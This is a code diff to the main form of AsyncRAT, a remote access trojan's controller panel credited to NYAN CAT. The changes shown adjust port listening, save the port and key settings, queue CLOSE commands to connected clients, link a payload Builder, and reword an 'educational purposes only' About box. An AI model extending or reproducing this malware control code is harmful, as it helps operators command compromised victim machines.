@@ -15,7 +15,10 @@ Imports System.IO
 Public Class Form1
     Public S As Server
 
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+    Private Async Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        Await Task.Delay(250)
+
         Messages.F = Me
 
         Pending.Req_In = New List(Of Incoming_Requests)
@@ -33,31 +36,38 @@ Public Class Form1
                 Dim A As String() = Split(PORTS.TextBox1.Text.Trim, ",")
                 For i As Integer = 0 To A.Length - 1
                     If Not String.IsNullOrWhiteSpace(A(i)) Then
-                        Settings.Ports.Add(A(i))
+                        Settings.Ports.Add(A(i).Trim)
                         S = New Server
                         Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
-                        listener.Start(A(i))
+                        listener.Start(A(i).Trim)
                     End If
                 Next
                 Settings.KEY = PORTS.TextBox2.Text
                 PORTS.Close()
+                STV("PORTS", String.Join(",", Settings.Ports.ToList))
+                STV("KEY", Settings.KEY)
             Else
                 Environment.Exit(0)
             End If
         Catch ex As Exception
-            Debug.WriteLine("URL " + ex.Message)
+            Debug.WriteLine("PORTS INTRO " + ex.Message)
         End Try
+    End Sub
 
-
+    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
+        Try
+            Application.Exit()
+            Environment.Exit(0)
+        Catch ex As Exception
+        End Try
     End Sub
 
     Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
                 Dim B As Byte() = SB("CLOSE")
+
                 For Each C As ListViewItem In LV1.SelectedItems
-                    '   Dim x As Client = CType(C.Tag, Client)
-                    '  x.Send(B)
                     Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                     Pending.Req_Out.Add(ClientReq)
                 Next
@@ -156,9 +166,7 @@ Public Class Form1
     End Sub
 
     Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
-        MsgBox("
-
-
+        MessageBox.Show("
        │ Author       : NYAN CAT
 
        │ Name         : AsyncRAT
@@ -167,17 +175,8 @@ Public Class Form1
 
        │ This program is distributed for educational purposes only.
 
-       │ Feel free to modify this software but a credit and a link back to my GitHub is needed
-
-
+       │ Feel free to modify this software, but a credit and a link back to my GitHub is needed
 ")
-    End Sub
-
-    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
-        Try
-            Environment.Exit(0)
-        Catch ex As Exception
-        End Try
     End Sub
 
     Private Sub LV1_MouseMove(sender As Object, e As MouseEventArgs) Handles LV1.MouseMove
@@ -234,6 +233,7 @@ Public Class Form1
                 T.Close()
             End If
         Catch ex As Exception
+            Debug.WriteLine("AddTaskToolStripMenuItem_Click " + ex.Message)
         End Try
     End Sub
 
@@ -251,4 +251,5 @@ Public Class Form1
     Private Sub BUILDERToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BUILDERToolStripMenuItem.Click
         Builder.ShowDialog()
     End Sub
+
 End Class
